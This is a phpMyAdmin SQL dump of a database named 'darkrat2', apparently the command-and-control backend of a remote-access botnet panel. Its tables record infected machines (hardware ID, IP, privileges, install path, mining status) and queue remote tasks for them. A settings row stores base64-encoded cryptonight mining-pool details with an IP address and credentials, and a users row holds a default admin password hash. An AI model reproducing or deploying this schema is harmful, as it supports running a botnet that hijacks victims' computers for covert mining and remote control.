-- phpMyAdmin SQL Dump
-- version 4.5.4.1deb2ubuntu2.1
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Erstellungszeit: 08. Nov 2018 um 13:11
-- Server-Version: 5.7.24-0ubuntu0.16.04.1
-- PHP-Version: 7.0.32-0ubuntu0.16.04.1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Datenbank: `darkrat2`
--

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `bots`
--

CREATE TABLE `bots` (
  `id` int(255) NOT NULL,
  `bothwid` varchar(100) DEFAULT NULL,
  `ipaddress` varchar(75) DEFAULT NULL,
  `country` int(5) DEFAULT NULL,
  `installdate` int(50) DEFAULT NULL,
  `lastresponse` int(50) DEFAULT NULL,
  `currenttask` int(255) DEFAULT NULL,
  `operatingsys` varchar(300) DEFAULT NULL,
  `botversion` varchar(30) DEFAULT NULL,
  `privileges` varchar(5) DEFAULT NULL,
  `installationpath` text,
  `computername` text,
  `lastreboot` text,
  `miningstatus` varchar(255) NOT NULL DEFAULT 'Idle',
  `lastminerstart` text,
  `cpu` varchar(255) NOT NULL DEFAULT 'none',
  `gpu` varchar(255) NOT NULL DEFAULT 'none',
  `mark` int(1) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;


CREATE TABLE `plogs` (
  `id` int(255) NOT NULL,
  `username` varchar(50) NOT NULL,
  `ipaddress` varchar(75) NOT NULL,
  `action` text NOT NULL,
  `date` int(50) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

CREATE TABLE `settings` (
  `id` int(255) NOT NULL,
  `knock` int(10) NOT NULL,
  `dead` int(10) NOT NULL,
  `gate_status` int(1) NOT NULL,
  `miner_autostart` int(1) NOT NULL DEFAULT '0',
  `miner_hwidAsUser` varchar(1) DEFAULT '0',
  `mining_algorithm` varchar(255) DEFAULT NULL,
  `mining_server` varchar(255) DEFAULT NULL,
  `mining_username` varchar(255) DEFAULT NULL,
  `mining_password` varchar(255) DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Daten für Tabelle `settings`
--

INSERT INTO `settings` (`id`, `knock`, `dead`, `gate_status`, `miner_autostart`, `miner_hwidAsUser`, `mining_algorithm`, `mining_server`, `mining_username`, `mining_password`) VALUES
(1, 10, 14, 1, 1, '1', 'Y3J5cHRvbmlnaHQ=', 'MzEuMjE0LjI0MC4xMDU6MzMzMw==', 'dGVzdDIzMjQ=', 'dGVzdDMy');

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `tasks`
--

CREATE TABLE `tasks` (
  `id` int(255) NOT NULL,
  `task` varchar(100) NOT NULL,
  `params` text NOT NULL,
  `filters` text NOT NULL,
  `executions` varchar(100) NOT NULL,
  `username` varchar(50) NOT NULL,
  `status` int(1) NOT NULL,
  `execution_only` varchar(255) DEFAULT NULL,
  `date` int(50) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `tasks_completed`
--

CREATE TABLE `tasks_completed` (
  `id` int(255) NOT NULL,
  `bothwid` varchar(100) NOT NULL,
  `taskid` int(255) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Daten für Tabelle `tasks_completed`
--


-- --------------------------------------------------------

--
-- Tabellenstruktur für Tabelle `users`
--

CREATE TABLE `users` (
  `id` int(255) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(300) NOT NULL,
  `privileges` varchar(300) NOT NULL,
  `status` int(1) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Daten für Tabelle `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `privileges`, `status`) VALUES
(1, 'admin', '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', 'admin', 1);

--
-- Indizes der exportierten Tabellen
--

--
-- Indizes für die Tabelle `bots`
--
ALTER TABLE `bots`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `plogs`
--
ALTER TABLE `plogs`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `settings`
--
ALTER TABLE `settings`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `tasks`
--
ALTER TABLE `tasks`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `tasks_completed`
--
ALTER TABLE `tasks_completed`
  ADD PRIMARY KEY (`id`);

--
-- Indizes für die Tabelle `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT für exportierte Tabellen
--

--
-- AUTO_INCREMENT für Tabelle `bots`
--
ALTER TABLE `bots`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=496;
--
-- AUTO_INCREMENT für Tabelle `plogs`
--
ALTER TABLE `plogs`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=87;
--
-- AUTO_INCREMENT für Tabelle `settings`
--
ALTER TABLE `settings`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT für Tabelle `tasks`
--
ALTER TABLE `tasks`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;
--
-- AUTO_INCREMENT für Tabelle `tasks_completed`
--
ALTER TABLE `tasks_completed`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=117;
--
-- AUTO_INCREMENT für Tabelle `users`
--
ALTER TABLE `users`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
